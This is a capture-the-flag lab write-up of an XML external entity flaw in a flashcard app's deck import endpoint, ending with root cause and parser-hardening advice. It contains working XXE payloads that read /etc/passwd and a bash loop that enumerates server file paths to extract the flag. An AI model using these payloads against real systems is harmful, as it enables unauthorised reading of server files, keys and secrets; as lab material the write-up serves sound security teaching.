# Bug Forge — Tanuki SRS: XXE in Deck Import

**Target:** `https://lab-1779825489748-waxfod.labs-app.bugforge.io`
**Category:** Web / XML External Entity (XXE)
**Flag:** `bug{Fz8AHOh7AC6NzOdUMbVxeHD3yjwrJ5fE}`

## TL;DR
The Tanuki SRS flashcard app exposes `POST /api/decks/import` which parses an uploaded XML file with external entities enabled. By declaring an external entity pointing at `file:///app/flag.txt` and using it inside the `<name>` element, the parser inlines the file contents into the deck name — readable via `GET /api/decks/{id}`.

## Recon

1. The login page (`/login`) is a React SPA. The bundle `static/js/main.2a8c2eb1.js` exposes API routes:
   ```
   /api/register      /api/login        /api/verify-token
   /api/decks         /api/decks/import /api/decks/{id}
   /api/study/...     /api/admin/...    /api/stats
   ```
2. Inspecting the import handler in the bundle:
   ```js
   const r = new FormData();
   r.append("file", t);
   const t = await jo.post("/api/decks/import", r,
     { headers: { "Content-Type": "multipart/form-data" }});
   ```
   Filetype is not constrained client-side. "Deck import" + free-form file upload is a classic XML parsing attack surface.

## Foothold

Register a low-priv user and grab a JWT:

```bash
curl -s -X POST .../api/register \
  -H 'Content-Type: application/json' \
  -d '{"username":"claudia99","email":"c99@x.io","password":"Pass1234!"}'

TOKEN=$(curl -s -X POST .../api/login \
  -H 'Content-Type: application/json' \
  -d '{"username":"claudia99","password":"Pass1234!"}' | jq -r .token)
```

## Vulnerability — XXE

Confirm the import accepts XML decks:

```xml
<?xml version="1.0"?>
<deck>
  <name>probe</name>
  <cards><card><front>q</front><back>a</back></card></cards>
</deck>
```

```
{"id":4,"message":"Deck imported successfully","cards_count":1}
```

The parser accepts XML and the deck `name` is reflected back via `GET /api/decks/{id}`. Drop in an external entity:

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<deck>
  <name>&xxe;</name>
  <cards><card><front>q</front><back>a</back></card></cards>
</deck>
```

Fetching the deck record returns:

```json
{"id":5,"name":"Flag is in a different file","description":"","card_count":1}
```

The server resolved the entity and stored the file contents as the deck name — confirmed XXE with file read. The `/etc/passwd` was overridden by the lab to leave a hint: *"Flag is in a different file."*

## Exploitation

Loop through likely flag locations, submitting one XXE-laden deck per path and reading back `name`:

```bash
for P in /flag /flag.txt /root/flag.txt /root/flag /app/flag.txt /app/flag \
         /home/flag.txt /var/flag /etc/flag /flag/flag.txt; do
  cat > x.xml <<EOF
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file://$P">]>
<deck><name>&xxe;</name><cards><card><front>q</front><back>a</back></card></cards></deck>
EOF
  R=$(curl -s -X POST .../api/decks/import \
        -H "Authorization: Bearer $TOKEN" -F "file=@x.xml")
  ID=$(jq -r .id <<<"$R")
  N=$(curl -s -H "Authorization: Bearer $TOKEN" \
        ".../api/decks/$ID" | jq -r .name)
  echo "$P -> $N"
done
```

Result:

```
/flag           -> &xxe;
/flag.txt       -> &xxe;
/root/flag.txt  -> &xxe;
/app/flag.txt   -> bug{Fz8AHOh7AC6NzOdUMbVxeHD3yjwrJ5fE}
...
```

When the file does not exist or cannot be read, the parser fails open and leaves the literal `&xxe;`. When the file is readable, contents are substituted directly.

**Flag:** `bug{Fz8AHOh7AC6NzOdUMbVxeHD3yjwrJ5fE}`

## Root Cause

The deck import handler parses untrusted XML with an engine that has external entity resolution enabled (e.g. `libxml2` without `LIBXML_NONET | LIBXML_NOENT` disabled, Python's `lxml`/`xml.etree` with default DTD handling, Java `DocumentBuilderFactory` without `disallow-doctype-decl`, etc.). Any field whose value comes from XML — here, `<name>` — can be replaced by arbitrary file contents from the server filesystem.

## Impact

- Arbitrary local file read as the application user (`/app/flag.txt`, source code, config files, secrets, JWT signing keys).
- Pivotable to SSRF if the parser supports `http://` URIs in `SYSTEM` declarations.
- With OOB exfiltration (parameter entities + external DTD), the technique extends to multi-line files and binary content via PHP base64 wrappers.

## Remediation

- Disable DTD processing and external entity resolution in the XML parser.
  - Python `lxml`: `etree.XMLParser(resolve_entities=False, no_network=True, load_dtd=False)`.
  - Python stdlib: switch to `defusedxml`.
  - Java: `factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true)`.
  - Node `libxmljs`: `noent: false, noblanks: false, nonet: true`.
- Validate uploaded files against a strict schema and reject any document containing a `DOCTYPE`.
- Treat XML imports as untrusted input — sandbox the parser process or run it under a least-privilege user.

## Timeline

- Recon and parser fingerprint: minutes.
- First file read confirmation: 1 request.
- Flag retrieval: ~10 requests of path enumeration.
